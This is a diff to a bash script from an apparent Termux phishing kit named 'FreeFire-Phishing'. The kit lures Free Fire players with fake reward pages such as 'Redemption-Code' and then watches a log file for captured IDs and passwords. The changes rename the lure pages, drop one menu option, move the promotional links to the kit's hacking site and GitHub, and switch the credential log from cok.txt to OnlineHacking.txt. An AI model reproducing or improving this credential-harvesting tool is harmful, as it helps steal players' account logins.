@@ -213,12 +213,7 @@ echo -e "\e[33m
   █████╗  ██████╔╝█████╗  █████╗█████╗█████╗  ██║██████╔╝█████╗   
   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝╚════╝██╔══╝  ██║██╔══██╗██╔══╝   
   ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗ 
-  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ \e[93;1m v 2.0\e[0m\n"
-  
-echo -e " \e[36mFree Live Hacking : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
-  
-echo -e " \e[36mOriginal GitHub : \e[0m\e[92mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m\n"
-  
+  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ \e[93;1m v 2.0\e[0m\n"  
 echo -e "\e[95m
          ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
         ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
@@ -233,6 +228,11 @@ echo -e "\e[95m
      ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
      ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
      ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  \e[95;1m \e[0m\n"
+     
+echo -e " \e[36mFree Live Hacking : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
+  
+echo -e " \e[31mOriginal GitHub : \e[0m\e[92mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m\n"
+
 echo 
 echo -e $'\e[1;32m        =======================================           \e[0m'
 echo -e $'         \e[1;37;41m    c r e a t e d  b y  S u m a n      \e[m '
@@ -245,11 +245,9 @@ printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mBest-Page \e[33mD
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mLucky-Spin-OH\e[0m"
+printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mRedemption-Code\e[0m"
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo
-printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mBonusChallenge-Free-Gift-OH\e[0m"
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
@@ -337,7 +335,7 @@ ash1() {
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
 			   cd /data/data/com.termux/files/usr/bin/phs
-                           cd Lucky-Spin-OH/
+                           cd Redemption-Code/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -362,7 +360,7 @@ ash1() {
 			   echo 
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
                            echo 
-                           tail -f cok.txt | grep -e "id" -e "password"      
+                           tail -f OnlineHacking.txt | grep -e "id" -e "password"      
 
                            break;
 
